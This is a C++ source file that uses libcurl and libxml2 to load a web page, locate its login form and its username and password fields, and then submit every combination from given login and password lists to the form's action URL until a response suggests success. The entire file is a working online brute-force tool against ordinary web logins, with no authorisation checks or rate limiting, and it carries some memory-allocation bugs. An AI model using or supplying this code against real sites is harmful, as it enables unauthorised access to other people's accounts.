#include <stdio.h>
#include <string.h>
#include <string>
#include <curl/curl.h>
#include <libxml/HTMLparser.h>
#include <iostream>
#include <list>
using namespace std;

//
//  libxml callback context structure
//

struct Context{
	Context(): containsForm(false) { }
	char* formMethod = NULL;
	char* login = NULL;
	char* password = NULL;
	char* action = NULL;
	bool containsForm;
} form;

//
//  libcurl variables for error strings and returned data

static char errorBuffer[CURL_ERROR_SIZE];
static string buffer;
static string bufferNewHost;
bool successfulLogin = false;

static const char* possibleLoginFields[] = {"login", "your_email", "username"}; // Possible login fields names

//
//  libcurl write callback function
//

static int writer(char *data, size_t size, size_t nmemb,
                  std::string *writerData){
  if (writerData == NULL)
	return 0;

  writerData->append(data, size*nmemb);

  return size * nmemb;
}

//
//  libcurl connection initialization
//

static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
	struct WriteThis *pooh = (struct WriteThis *)userp;
	if(size*nmemb < 1){	
		return 0;
	}
 
  return 0; 
}

static bool init(CURL *&conn, char *url){
	CURLcode code;

	curl_global_init(CURL_GLOBAL_DEFAULT);	
	conn = curl_easy_init();

	if (conn == NULL){
		fprintf(stderr, "Failed to create CURL connection\n");

		exit(EXIT_FAILURE);
	}

	code = curl_easy_setopt(conn, CURLOPT_ERRORBUFFER, errorBuffer);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set error buffer [%d]\n", code);

    	return false;
  	}

	code = curl_easy_setopt(conn, CURLOPT_URL, url);
	if (code != CURLE_OK){
		fprintf(stderr, "Failed to set URL [%s]\n", errorBuffer);

		return false;
	}

  	code = curl_easy_setopt(conn, CURLOPT_FOLLOWLOCATION, 1L);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set redirect option [%s]\n", errorBuffer);

    	return false;
	}

	code = curl_easy_setopt(conn, CURLOPT_WRITEFUNCTION, writer);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);

    	return false;
  	}

  	code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, &buffer);
  	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);

    	return false;
  	}

  	/* we want to use our own read function */ 
	code = curl_easy_setopt(conn, CURLOPT_READFUNCTION, &read_callback);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);

    	return false;
	}

  return true;
}

const xmlChar* findElement(const xmlChar **attributes, const char* element){
	for(int i = 0; *(attributes + i) != NULL; i++){
		if(!strcasecmp((char*)(*(attributes + i)), element)){
			return *(attributes + i + 1);
		}
	}
	return NULL;
}

const xmlChar* findElementNameByType(const xmlChar **attributes, const char* elementType){
	for(int i = 0; *(attributes + i) != NULL; i++){
		if(!strcasecmp((char*)(*(attributes + i)), "type") && !strcasecmp((char*)(*(attributes + i + 1)), elementType)){
			for(int j = 0; *(attributes + j) != NULL; j++){
				if(!strcasecmp((char*)(*(attributes + j)), "name")){
					return *(attributes + j + 1);
				}
			}
		}
	}
	return NULL;
}

const xmlChar* findElementValueByType(const xmlChar **attributes, const char* elementType){
	for(int i = 0; *(attributes + i) != NULL; i++){
		if(!strcasecmp((char*)(*(attributes + i)), elementType)){
			return *(attributes + i + 1);
		}
	}
	return NULL;
}

//
//  libxml start element callback function
//
static void StartElement(void *voidContext, const xmlChar *name, const xmlChar **attributes){
	Context *context = (Context *)voidContext;
	if (!strcasecmp((char *)name, "form")){
		const xmlChar* tempFormMethod = findElement(attributes, "method");

		if(tempFormMethod){
			form.containsForm = true;
			form.formMethod = (char*)malloc((strlen((char*)tempFormMethod))*sizeof(xmlChar*));
			strcpy(form.formMethod, (char*)tempFormMethod);
			printf("=== Found method tag  = %s \n", form.formMethod);
			const xmlChar* tempAction = findElementValueByType(attributes, "action");
			if(tempAction){
				form.action = (char*)malloc((strlen((char*)tempAction))*sizeof(xmlChar*));
				strcpy(form.action, (char*)tempAction);
				printf("=== Found action tag inside form  = %s \n", form.action);
			}
		} else {
			printf("=== Method did not founded \n");
		}
	}
	if(form.containsForm  && !strcasecmp((char *)name, "input")) {
		if(!form.password) {
			const xmlChar* tempFormPassword = findElementNameByType(attributes, "password");
			if(tempFormPassword){
				form.password = (char*)malloc((strlen((char*)tempFormPassword))*sizeof(xmlChar*));
				strcpy(form.password, (char*)tempFormPassword);
				printf("=== Found password  = %s \n", form.password);
			}
		}
		if(!form.login){
			const xmlChar* tempFormLogin = findElementNameByType(attributes, "text");
			if(tempFormLogin){
				for(int i = 0; i<3; i++){
					if(!strcasecmp((char*)tempFormLogin, possibleLoginFields[i])){
						form.login = (char*)malloc((strlen((char*)tempFormLogin))*sizeof(xmlChar*));
						strcpy(form.login, (char*)tempFormLogin);
						printf("=== Found login  = %s \n", form.login);
					}
				}
			}
		}
	}
}


//
//  libxml end element callback function
//

static void EndElement(void *voidContext,
                       const xmlChar *name){
  Context *context = (Context *)voidContext;
  /*if (!strcasecmp((char *)name, "form")){
	  form.containsForm = false;
  }*/
}

static htmlSAXHandler saxHandler = {
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  StartElement,
  EndElement,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL
};

//
//  Parse given (assumed to be) HTML text and btutforce atack on the page
//

static void parseHtml(const std::string &html){
	htmlParserCtxtPtr ctxt;
	Context context;
	ctxt = htmlCreatePushParserCtxt(&saxHandler, &context, "", 0, "", XML_CHAR_ENCODING_NONE);
	htmlParseChunk(ctxt, html.c_str(), html.size(), 0);
	htmlParseChunk(ctxt, "", 0, 1);
	htmlFreeParserCtxt(ctxt);
}

string* concat(char* action, const char *login, string loginValue, const char *password, string passwordValue){
	string* result = new string;

	if(action){
		result->append(action);
		result->append("?");
	}
	result->append((char*)login);
	result->append("=");
	result->append(loginValue);
	result->append("&");
	result->append((char*)password);
	result->append("=");
	result->append(passwordValue);

	return result;
}

static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passwords, Context& form, char* action){
	string *data;
	CURLcode code;
	CURL *curl;
	string respBuffer;
	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	if(!curl){
		cerr<<"curl initialization error \n";
		return ;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
	if (code != CURLE_OK){
		fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);
		return ;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &respBuffer);
	if (code != CURLE_OK){
		fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
		return ;
	}

	cout<<__LINE__<<endl;
	//Brute force for all combinations of the given logins and passwords
	for (list<string>::iterator loginIt = logins.begin(); loginIt != logins.end(); ++loginIt){
		cout<<__LINE__<<endl;
		for (list<string>::iterator passwordIt = passwords.begin(); passwordIt != passwords.end(); ++passwordIt){

			if(!strcasecmp((char*)form.formMethod, "post")){
				curl_easy_setopt(curl, CURLOPT_URL,  action);
				data = concat(NULL, form.login, *loginIt, form.password, *passwordIt);
				cout<<*data<<endl;
				cout<<"action = "<<action<<endl;
				curl_easy_setopt(curl, CURLOPT_POST, 1);
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data->c_str());
			} else if(!strcasecmp((char*)form.formMethod, "get")){
				cout<<__LINE__<<endl;
				data = concat(action, form.login, *loginIt, form.password, *passwordIt);
				cout<<*data<<endl;
				curl_easy_setopt(curl, CURLOPT_URL,  data->c_str());
			}

			cout<<"perform some attack \n";
			respBuffer.clear();
			code = curl_easy_perform(curl);
			if(code != CURLE_OK){
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(code));
				break;
			}
			cout<<__LINE__<<endl;

			//cout<<"respBuffer"<<respBuffer<<endl;
			if (strstr(respBuffer.c_str(), (*loginIt).c_str()) != NULL){
				cout<<"Congradulation you have logged in\n";
				cout<<"Login ="<<*loginIt<<" Password ="<<*passwordIt<<endl;
				return;
			 }
		}
	}
	cout<<"There is no login or password correspondance \n";
}

bool startAttack(string& hostName, list<string>& logins, list<string>& passwords){
	CURL *conn = NULL;
	CURLcode code;
	if (!init(conn, (char*)hostName.c_str())){
		fprintf(stderr, "Connection initializion failed\n");

		return false;
	}

	// Retrieve content for the URL
	code = curl_easy_perform(conn);
	cout<<__LINE__<<endl;
	if (code != CURLE_OK) {
		fprintf(stderr, "Failed to get  [%s]\n", errorBuffer);

		return false;
	}

	cout<<__LINE__<<endl;
	// Parse the (assumed) HTML code

	parseHtml(buffer);

	if(!form.action){
		fprintf(stderr, "There is no action in the given page \n");

		exit(EXIT_FAILURE);
	}

	if(!form.containsForm){
		fprintf(stderr, "There is no form in the given page \n");

		exit(EXIT_FAILURE);
	}

	if(!form.login || !form.password){
		fprintf(stderr, "There no login or password field \n");

		exit(EXIT_FAILURE);
	}
	curl_easy_cleanup(conn);
	curl_global_cleanup();
	string first(form.action);
	string newHost = hostName + "/" + first;
	cout<<"new host name ="<<newHost<<endl;
	cout<<"after c_str ="<<newHost.c_str()<<endl;
	bruteForceLoginAndPassword(logins, passwords, form, (char*)newHost.c_str());
}

